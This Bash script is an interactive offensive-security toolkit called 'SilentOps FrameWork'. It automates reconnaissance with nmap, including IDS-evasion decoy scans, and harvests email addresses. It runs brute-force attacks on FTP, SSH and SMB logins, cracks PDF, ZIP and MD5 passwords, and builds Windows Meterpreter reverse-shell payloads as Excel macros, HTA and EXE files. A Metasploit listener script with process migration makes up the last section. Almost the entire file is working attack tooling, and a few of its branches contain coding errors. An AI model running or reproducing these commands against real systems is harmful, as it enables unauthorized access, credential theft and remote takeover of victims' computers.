#!/bin/bash
source /home/kali/Silent_Ops_FrameWork/ui_engine.sh
while true; do
clear
echo "=============================="
echo "          MAIN MENU           "
echo "=============================="
echo "Author   : Rakan Ahmad"
echo "Tool     : SilentOps FrameWork (OFFENSIVE SECURITY) "
echo "Purpose  : Educational / Authorized Testing Only"
echo "                                                         "
echo "1) Reconnaissance & Enumeration "                                                
echo "2) Offline Attack & Online Attack "   
echo "3) CRAFT a PAYLOADS "
echo "4) Create your HANDLER (LISTENER)  "                        	    
read  -p "Choose The Section You Want To Use : " USERINPUT1
	if [ -z "$USERINPUT1" ];
then
	echo "You Must Choose The Section"
exit 1
	fi
clear
if [ "$USERINPUT1" == "1" ];
	then
echo "==============================================================="
echo "               RECONNAISSANCE & SCANNING MENU                  "
echo "==============================================================="
echo "1) Emails Gathering  "
echo "2) Port Scanning & Host Discovey "
echo "3) TCP Scan With Fragmented Packets and IDS evasion (SLOW BUT ANONYMOUSLY)"
echo "4) UDP Scan With Fragmented Packets and IDS evasion (SLOW BUT ANONYMOUSLY)"
echo "5) Search For The Most popular vulnerability  "
echo "6) SMB enumeration (ALL)    "
echo "7) SNMP enumeration (ALL)    "
echo "0) Back"
[ "$UINPUT" = "0" ] && clear && continue
#------------OPTION 1----------------------------
read -p "Choose The Section You Want IT : " UINPUT2 
read -p "Save results to file? (y/n): " SAVE
OUTFILE="results_$(date +%F_%H-%M-%S).txt"
	if [ "$UINPUT2" = "1" ]; 
then
	read -p "Insert The Target Domain :" TARGETIP1

	if [ -n "$TARGETIP1" ];
then   
	echo "Gathering...."
[ "$SAVE" = "y" ] \
	&& theHarvester -d "$TARGETIP1" -b all | grep -i "@" \
 	| tee -a "$OUTFILE" || theHarvester -d "$TARGETIP1" -b all | grep -i "@"


read -p "Press ENTER to return to Main Menu..."
clear

	else
echo "YOU MUST TYPE THE DOMAIN OF THE TARGET"
	exit 1
fi
fi
#-----------------OPTION 2----------------------
if [ "$UINPUT2" = "2"  ];
	then 
read -p "Insert The Target IP OR Domain : " TARGETIP2
	
if [ -n "$TARGETIP2" ];
	then
echo "[+] Scanning :"
	
	[ "$SAVE" = "y" ] && nmap -p- -O "$TARGETIP2"  | tee -a "$OUTFILE" || nmap -p- -O "$TARGETIP2" 

read -p "Press ENTER to return to Main Menu..."
clear

else
	echo "U MUST INSERT THE DOMAIN OF THE TARGET"
exit 1
fi
	fi

#-------------OPTION 3------------------------
if [ "$UINPUT2" = "3" ]; then
    read -p "Insert The Domain Of The Target : " TARGETIP3

    if [ -n "$TARGETIP3" ]; then
        echo "[+] Scanning... :"
	[ "$SAVE" = "y" ] && nmap -sS -f --mtu 8 -D RND:2 --scan-delay 5s "$TARGETIP3"  | tee -a "$OUTFILE" || nmap -sS -f --mtu 8 -D RND:2 --scan-delay 5s "$TARGETIP3" 

read -p "Press ENTER to return to Main Menu..."
clear

    else
        echo "U MUST INSERT THE DOMAIN OF THE TARGET"
        exit 1
    fi
fi

#------------OPTION4-------------------------
if [ "$UINPUT2" = "4" ];
	then
read -p "Inser The Target IP/Domain : " TARGETIP4
	if [ -n "$TARGETIP4" ];
then
	echo "[+] Scanning...."
	
	[ "$SAVE" = "y" ] && nmap -sU -f --mtu 8 -D RND:2 --scan-delay 5s "$TARGETIP4" | tee -a "$OUTFILE" || nmap -sU -f --mtu 8 -D RND:2 --scan-delay 5s "$TARGETIP4"

read -p "Press ENTER to return to Main Menu..."
clear

else
	echo "U MUST TYPE THE TARGET IP/DOMAIN"
exit 1
	fi
fi
#----------OPTION5-------------------------
if [ "$UINPUT2" = "5" ];
	then
read -p "Insert The Target IP/Domain : " TARGETIP5
	if [ -n "$TARGETIP5" ];
then
	echo "[+] Scanning...."
	[ "$SAVE" = "y" ] && nmap -sV --script vulners --script-args min-cvss "$TARGETIP5" | tee -a "$OUTFILE" || nmap -sV --script vulners --script-args min-cvss "$TARGETIP5"

read -p "Press ENTER to return to Main Menu..."
clear

else
	echo "U MUST TYPE THE TARGET IP/DOMAIN"
exit 1
	fi
fi
#---------OPTION6-------------------------
if [ "$UINPUT2" = "6" ];
	then
read -p "Insert The Target IP/Domain : " TARGETIP6
	if [ -n "$TARGETIP6" ];
then
	echo "[+] Enumerating...."
	[ "$SAVE" = "y" ] && nmap --script "smb-*" "$TARGETIP6" | tee -a "$OUTFILE" || nmap --script "smb-*" "$TARGETIP6"

read -p "Press ENTER to return to Main Menu..."
clear

else
	echo "U MUST TYPE THE TARGET IP/DOMAIN"
exit 1
	fi
fi
#-----OPTION7-----------------------------
if [ "$UINPUT2" = "7"  ];
	then
read -p "Insert The Target IP or Domain : " TARGETIP7
	if [ -n "$TARGETIP7" ];
then
	echo "[+] Enumerating...."
	[ "$SAVE" = "y" ] && nmap --script=snmp-* "$TARGETIP7"  | tee -a "$OUTFILE" || nmap --script=snmp-* "$TARGETIP7" 

read -p "Press ENTER to return to Main Menu..."
clear

else
	echo "U MUST TYPE THE TARGET IP/DOMAIN"
exit 1
	fi
fi
	fi
#------SECTION2----------------------------
if [ "$USERINPUT1" == "2" ]; then
    echo "==============================================================="
    echo "             ATTACK & PASSWORD CRACKING MENU                   "
    echo "==============================================================="
    echo "[*] Online Password Attack"
    echo "1) FTP Brute Force"
    echo "2) SSH Brute Force"
    echo "3) SMB Brute Force"
    echo "[*] Offline Password Attack"
    echo "4) PDF Password Cracking    "
    echo "5) ZIP Password Cracking    "
    echo "6) MD5 HASH Cracking    "
    echo "0) Back"
    read -p "Choose The Section You Want To Use : " UINPUT3
[ "$UINPUT3" = "0" ] && clear && continue

#-----------------OPTION1--------------------------------------
if [ "$UINPUT3" = "1"  ];
	then
read -p "Target Ip : " TARGET_IP
        if [ -z "$TARGET_IP" ]; 
then 
        echo "The Target Ip Cannot Be Empty"
exit 1    
        fi
if [ ! -z "$TARGET_IP" ]; 
        then
nmap -sV -p 21 "$TARGET_IP" > scan_result_ftp.txt
        fi
if grep "21/tcp open" scan_result_ftp.txt
        then
echo "FTP PORT OPEN"
        read -p "If You Have A Users Wordlists Insert The Path Here If You Dont Have Just Press Enter :" PATH1
read -p "If You Have A Passwords Wordlists Insert The Path Here If You Dont Have Just Press Enter :" PATH2
        else
echo "Sorry The Port 21 Is closed "
        fi
if [ ! -z "$PATH1" ] && [ ! -z "$PATH2" ]; 
        then 
[ "$SAVE" = "y" ] && hydra -L "$PATH1" -P "$PATH2" ftp://"TARGET_IP" -V | tee -a "$OUTFILE" || hydra -L "$PATH1" -P "$PATH2" ftp://"TARGET_IP" -V

read -p "Press ENTER to return to Main Menu..."
clear

        else
hydra -L /home/kali/Silent_Ops_FrameWork/ftp_usernames_list.txt -P /home/kali/Silent_Ops_FrameWork/ftp_passwords_list.txt ftp://"$TARGET_IP" -V  -o ftp_brute_force_result.txt -I

read -p "Press ENTER to return to Main Menu..."
clear

        fi
if [ -z "$PATH1"];
        then 
echo "Will Use admin Username as defulate..."
	hydra -L /home/kali/Silent_Ops_FrameWork/ftp_usernames_list.txt -P /home/kali/Silent_Ops_FrameWork/ftp_passwords_list.txt ftp://"$TARGET_IP" -V  -o ftp_brute_force_result.txt -I
read -p "Press ENTER to return to Main Menu..."
clear

else    

hydra -L /home/kali/Silent_Ops_FrameWork/ftp_usernames_list.txt -P /home/kali/Silent_Ops_FrameWork/ftp_passwords_list.txt ftp://"$TARGET_IP" -V -o ftp_brute_force_result.txt -I
read -p "Press ENTER to return to Main Menu..."
clear

fi
        if [ -z "$PATH2"];
then
        echo "Will Use The Passwords List  File contined in the tool"
	hydra -l "$PATH1" -P /home/kali/Silent_Ops_FrameWork/ftp_passwords_list.txt  ftp://"$TARGET_IP" -o ftp_brute_force_result.txt -V -I

read -p "Press ENTER to return to Main Menu..."
clear

        else
hydra -L "$PATH1" -P "$PATH2" ftp://"$TARGET_IP" -V -o ftp_brute_force_result.txt -I

read -p "Press ENTER to return to Main Menu..."
clear

	fi

fi
#---------------OPTION2------------------------------------
	if [ "$UINPUT3" = "2" ];
then
	read -p "Insert The Target IP : " TARGET_IP
        if [ -z "$TARGET_IP" ];
then
        echo "The Target IP Cannot Be Empty"
exit 1
        fi
if [ ! -z "$TARGET_IP" ];
        then
nmap -sV -p 22 "$TARGET_IP" > scan_result_ssh.txt

        fi
if grep -q "22/tcp open  ssh" scan_result_ssh.txt
        then
echo "ssh port is OPEN"
        else

echo "ssh port is closed"
        fi
read -p "If you Have A UserNames List Insert It Here To Use It In The BruteForce Attack On SSH PORT IF YOU DONT HAVE JUST PRESS ENTER : " PATH1
read -p "If you Have A Passwords List Insert It Here To Use It In The BruteForce Attack On SSH PORT IF YOU DONT HAVE JUST PRESS ENTER: " PATH2

if [ ! -z "$PATH1" ]  && [ ! -z "$PATH2" ];
        then
patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1="$PATH1" 0="$PATH2" 2>&1 | tee login_result.txt 
clear

        fi
if [ -z "$PATH1" ];
        then 
patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0  1=/home/kali/Silent_Ops_FrameWork/ssh_usernames_list.txt  0="$PATH2" 2>&1 | tee login_result.txt 

        fi

        if [ -z "$PATH2" ];
then
        patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1="$PATH1" 0=/home/kali/Silent_Ops_FrameWork/ssh_passwords_list.txt  2>&1 | tee login_result.txt 

        fi
        if [ -z "$PATH1" ] && [ -z "$PATH2" ];
then
        patator ssh_login host="$TARGET_IP" user=FILE1 password=FILE0 1=/home/kali/Silent_Ops_FrameWork/ssh_usernames_list.txt 0=/home/kali/Silent_Ops_FrameWork/ssh_passwords_list.txt 2>&1 | tee login_result.txt 
read -p "Press ENTER to return to Main Menu..."
clear

fi



fi


#-------------OPTION3-------------------
if [ "$UINPUT3" = "4" ]; then
    read -p "Insert The Path Of The PDF File: " PATH1
    if [ -n "$PATH1" ]; then

	pdf2john "$PATH1" > pdf.hash


        
        read -p "If U Have A WordList (PDF) Put It Here OR Press ENTER: " PASSWORDS1
        if [ -z "$PASSWORDS1" ]; then
	john --wordlist=/home/kali/Silent_Ops_FrameWork/pdf_passwords_wordlist.txt pdf.hash 


        else
	john --wordlist="$PASSWORDS1" pdf.hash



        fi
        john --show pdf.hash
read -p "Press ENTER to return to Main Menu..."
clear

    else
        echo "U MUST INSERT A FILE OR PATH"
    fi
fi 

#-------------OPTION4---------------
if [ "$UINPUT3" = "5" ]; then
     
    read -p "Insert The Path Of The ZIP File: " PATH2
    
    if [ -n "$PATH2" ]; then
        zip2john "$PATH2" > zip.hash
        echo "[+] Hash created successfully."

        read -p "Insert Wordlist Path (OR Press ENTER for Default): " PASSWORDS2
        
        if [ -z "$PASSWORDS2" ]; then
            john --wordlist=/home/kali/Silent_Ops_FrameWork/zip_passwords_wordlist.txt zip.hash

        else
            john --wordlist="$PASSWORDS2" zip.hash

        fi
        
        john --show zip.hash
read -p "Press ENTER to return to Main Menu..."


    else
        echo "Error: Path cannot be empty!"
read -p "Press ENTER to return to Main Menu..."
clear

    fi
fi 


if [ "$UINPUT3" = "6"  ];
	then
read -p "Insert The Path Of The (HASH MD5 FILE) : " PATH3


	if [ ! -z "$PATH3"  ];
then
	read -p "If You Have A Wordlist To Crack The Hash Insert The Path Of It If You Dont Have Just Press Enter : " passwords
else
	echo "U MUST INSERT THE PATH"
fi
	fi

	if [ ! -z "$passwords" ];
then
	john --format=Raw-MD5 --wordlist="$passwords" "$PATH3"
	john --show --format=Raw-MD5 "$PATH3"

fi
	if [ -z "$passwords" ];
then
	john --format=Raw-MD5 --wordlist=/home/kali/Silent_Ops_FrameWork/hash_wordlist.txt "$PATH3"
	john --show --format=Raw-MD5 "$PATH3"
read -p "Press ENTER to return to Main Menu..."
clear

fi
#---------OPTION6 (SMB Brute Force)-------------------------

if [ "$UINPUT3" = "3" ]; then
    read -p "Insert the target IP: " ip
    
    
    if [ -z "$ip" ]; then
        echo "Error: IP cannot be empty!"
    else
        echo "[*] Checking if SMB port is open..."
       
        nmap -p 445 "$ip" > smb_result.txt
        
        if grep -q "445/tcp open" smb_result.txt; then
            echo "[+] SMB port is OPEN."
            
            read -p "Usernames wordlist (Press ENTER for default): " userpath
            read -p "Passwords wordlist (Press ENTER for default): " passpath

           
            [ -z "$userpath" ] && userpath="/home/kali/Silent_Ops_FrameWork/user_names.txt"
            [ -z "$passpath" ] && passpath="/home/kali/Silent_Ops_FrameWork/passwords.txt"

            echo "[*] Starting Attack on $ip..."
            nmap --script smb-brute --script-args userdb="$userpath",passdb="$passpath" "$ip"
        else
            echo "[-] SMB port is CLOSED or Filtered on $ip."
        fi
    fi
    
   
    
    read -p "Press ENTER to return to Main Menu..."
    clear
fi
fi 
#-------------secion 3 -----------
if [ "$USERINPUT1" == "3" ]; then
    clear
    echo "==============================================================="
    echo "                       PAYLOADS MENU                           "
    echo "==============================================================="
    echo "1) VBA PSH (EXCEL) (REVERSE SHELL)"
    echo "2) VBA MACRO (EXCEL) (REVERSE SHELL)"
    echo "3) HTA psh (REVERSE SHELL)"
    echo "4) exe app (REVERSE SHELL)"
    echo "0) Back"
    read -p "Choose The Option You Want : " UINPUT4

   
    if [ "$UINPUT4" == "0" ]; then
        clear
        continue
    fi

   
    read -p "Set your LHOST for listening: " USERIP1
    if [ -z "$USERIP1" ]; then
        echo "ERROR: U MUST INSERT THE IP ..."
        sleep 2
        clear
        continue
    fi

    read -p "SET THE PORT U WANT TO USE (e.g., 4444): " USERPORT1
    if [ -z "$USERPORT1" ]; then
        echo "ERROR: U MUST SET THE PORT NUMBER"
        sleep 2
        clear
        continue
    fi

    
    echo "[*] Generating Payload... Please wait."

    if [ "$UINPUT4" == "1" ]; then
        msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST="$USERIP1" LPORT="$USERPORT1" -f vba-psh -o payload_psh.txt
    elif [ "$UINPUT4" == "2" ]; then
        msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST="$USERIP1" LPORT="$USERPORT1" -f vba -o payload_macro.txt
    elif [ "$UINPUT4" == "3" ]; then
        msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST="$USERIP1" LPORT="$USERPORT1" -f hta-psh -o payload.hta
    elif [ "$UINPUT4" == "4" ]; then
        msfvenom --platform windows -p windows/meterpreter/reverse_tcp LHOST="$USERIP1" LPORT="$USERPORT1" -f exe -o payload.exe
    else
        echo "Invalid Option!"
        sleep 2
        clear
        continue
    fi

    echo "[+] Done! Check your folder for the payload file."
    read -p "Press ENTER to return to Main Menu..."
    
fi
 if [ "$USERINPUT1" == "4" ]; then  
 echo "==============================================================="
 echo "                   HANDLER CRAFTING                            "
 echo "==============================================================="
 read -p "Set The LHOST : " handlerip
 if [ -z "$handlerip" ];
 	then
 echo "you must type the THE LHOST"
 else
 	builtin echo "use multi/handler" > handler.rc
 	builtin echo " set LHOST "$handlerip"" >> handler.rc
 	fi
 read -p "Set The LPORT U Already Used When U Crafted The Payload : " handlerport
 if [ -z "$handlerport" ]; then
 echo "ERROR U MUST TYPE THE LPORT"
 else
 builtin echo "set LPORT "$handlerport" " >> handler.rc
 builtin echo "set payload windows/meterpreter/reverse_tcp" >> handler.rc
 builtin echo "set INITIALAUTORUNSCRIPT post/windows/manage/migrate" >> handler.rc
 builtin echo "run" >> handler.rc
 fi
read -p "HANDLER IS READY IF YOU WANT TO RUN IT JUST TYPE (handler) IF NOT JUST PRESS ENTER : " handlerrun
if [  "$handlerrun" == "handler" ]; then
msfconsole -r handler.rc	
        
else
echo "BACK TO MAIN MENU ... "
sleep 2
        clear
        continue
fi
	fi





done 
